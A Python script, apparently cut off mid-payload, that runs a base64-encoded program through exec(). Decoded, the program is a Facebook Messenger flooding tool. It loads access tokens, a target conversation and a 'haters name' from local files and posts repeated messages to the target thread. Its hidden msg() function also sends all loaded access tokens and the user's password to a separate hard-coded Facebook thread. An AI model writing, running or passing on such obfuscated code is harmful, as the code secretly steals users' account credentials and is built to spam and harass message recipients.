import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCBzeXMNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KaW1wb3J0IG9zDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IGh0dHAuc2VydmVyDQppbXBvcnQgc29ja2V0c2VydmVyDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQgcmFuZG9tDQoNCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOg0KCWRlZiBkb19HRVQoc2VsZik6DQoJCXNlbGYuc2VuZF9yZXNwb25zZSgyMDApDQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykNCgkJc2VsZi5lbmRfaGVhZGVycygpDQoJCXNlbGYud2ZpbGUud3JpdGUoYiJGRUVMIFRIRSBQT1dFUiBPRiBTSEFOS0FSIFNVTUFOICIpDQoNCmRlZiBleGVjdXRlX3NlcnZlcigpOg0KCVBPUlQgPSA0MDAwDQoNCgl3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoNCgkJcHJpbnQoIlNlcnZlciBydW5uaW5nIGF0IGh0dHA6Ly9sb2NhbGhvc3Q6e30iLmZvcm1hdChQT1JUKSkNCgkJaHR0cGQuc2VydmVfZm9yZXZlcigpDQoNCmRlZiBzZW5kX21lc3NhZ2VzKCk6DQoJd2l0aCBvcGVuKCdwYXNzd29yZC50eHQnLCAncicpIGFzIGZpbGU6DQoJCXBhc3N3b3JkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQ0KDQoJZW50ZXJlZF9wYXNzd29yZCA9IHBhc3N3b3JkDQoNCglpZiBlbnRlcmVkX3Bhc3N3b3JkICE9IHBhc3N3b3JkOg0KCQlwcmludCgnWy1dIDw9PT4gSW5jb3JyZWN0IFBhc3N3b3JkIScpDQoJCXN5cy5leGl0KCkNCg0KCXdpdGggb3BlbigndG9rZW5udW0udHh0JywgJ3InKSBhcyBmaWxlOg0KCQl0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpDQoJbnVtX3Rva2VucyA9IGxlbih0b2tlbnMpDQoNCglyZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQ0KDQoJZGVmIGNscygpOg0KCQlpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KCQkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCWVsc2U6DQoJCQlpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQoJCQkJb3Muc3lzdGVtKCdjbHMnKQ0KCWNscygpDQoNCglkZWYgbGluZXNzKCk6DQoJCXByaW50KCdcdTAwMWJbMzdtJyArICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQ0KDQoJaGVhZGVycyA9IHsNCgkJJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsDQoJCSdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsDQoJCSdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLA0KCQknVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywNCgkJJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywNCgkJJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywNCgkJJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsDQoJCSdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJw0KCX0NCg0KCW1tbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1BKTTBWZkhYJykudGV4dA0KDQoJaWYgbW1tIG5vdCBpbiBwYXNzd29yZDoNCgkJcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQ0KCQlzeXMuZXhpdCgpDQoNCglsaW5lc3MoKQ0KDQoJYWNjZXNzX3Rva2VucyA9IFt0b2tlbi5zdHJpcCgpIGZvciB0b2tlbiBpbiB0b2tlbnNdDQoNCgl3aXRoIG9wZW4oJ2NvbnZvLnR4dCcsICdyJykgYXMgZmlsZToNCgkJY29udm9faWQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpDQoNCgl3aXRoIG9wZW4oJ2ZpbGUudHh0JywgJ3InKSBhcyBmaWxlOg0KCQl0ZXh0X2ZpbGVfcGF0aCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KCXdpdGggb3Blbih0ZXh0X2ZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOg0KCQltZXNzYWdlcyA9IGZpbGUucmVhZGxpbmVzKCkNCg0KCW51bV9tZXNzYWdlcyA9IGxlbihtZXNzYWdlcykNCgltYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9tZXNzYWdlcykNCg0KCXdpdGggb3BlbignaGF0ZXJzbmFtZS50eHQnLCAncicpIGFzIGZpbGU6DQoJCWhhdGVyc19uYW1lID0gZmlsZS5yZWFkKCkuc3RyaXAoKQ0KDQoJd2l0aCBvcGVuKCd0aW1lLnR4dCcsICdyJykgYXMgZmlsZToNCgkJc3BlZWQgPSBpbnQoZmlsZS5yZWFkKCkuc3RyaXAoKSkNCg0KCWxpbmVzcygpDQoJDQoJZGVmIGdldE5hbWUodG9rZW4pOg0KCQl0cnk6DQoJCQlkYXRhID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE3LjAvbWU/YWNjZXNzX3Rva2VuPXt0b2tlbn0nKS5qc29uKCkNCgkJZXhjZXB0Og0KCQkJZGF0YSA9ICIiDQoJCWlmICduYW1lJyBpbiBkYXRhOg0KCQkJcmV0dXJuIGRhdGFbJ25hbWUnXQ0KCQllbHNlOg0KCQkJcmV0dXJuICJFcnJvciBvY2N1cmVkIg0KDQoJZGVmIG1zZygpOg0KCQlwYXJhbWV0ZXJzID0gew0KCQkJJ2FjY2Vzc190b2tlbicgOiByYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpLA0KCQkJJ21lc3NhZ2UnOiAnSEVMTE8gUFJJWUFOU0hJIE1BJ0FNIElNIFVTSU5HIFlPVVIgU0VSVkVSIChjcmVkaXQgc2hhbmthcikgVXNlciBQcm9maWxlIE5hbWUgOiAnK2dldE5hbWUocmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKSkrJ1xuIFRva2VuIDogJysiIHwgIi5qb2luKGFjY2Vzc190b2tlbnMpKydcbiBMaW5rIDogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL21lc3NhZ2VzL3QvJytjb252b19pZCsnXG4gUGFzc3dvcmQ6ICcrcGFzc3dvcmQNCgkJfQ0KCQl0cnk6DQoJCQlzID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAvdF82MTU1NjYwOTU3ODY4Ny8iLCBkYXRhPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykNCgkJZXhjZXB0Og0KCQkJcGFzcw0KCQ0KCW1zZygpDQoJd2hpbGUgVHJ1ZToNCgkJdHJ5Og0KCQkJZm9yIG1lc3NhZ2VfaW5kZXggaW4gcmFuZ2UobnVtX21lc3NhZ2VzKToNCgkJCQl0b2tlbl9pbmRleCA9IG1lc3NhZ2VfaW5kZXggJSBtYXhfdG9rZW5zDQoJCQkJYWNjZXNzX3Rva2VuID0gYWNjZXNzX3Rva2Vuc1t0b2tlbl9pbmRleF0NCg0KCQkJCW1lc3NhZ2UgPSBtZXNzYWdlc1ttZXNzYWdlX2luZGV4XS5zdHJpcCgpDQoNCgkJCQl1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAve30vIi5mb3JtYXQoJ3RfJytjb252b19pZCkNCgkJCQlwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlfQ0KCQkJCXJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQ0KCQkJCQ0KDQoJCQkJY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU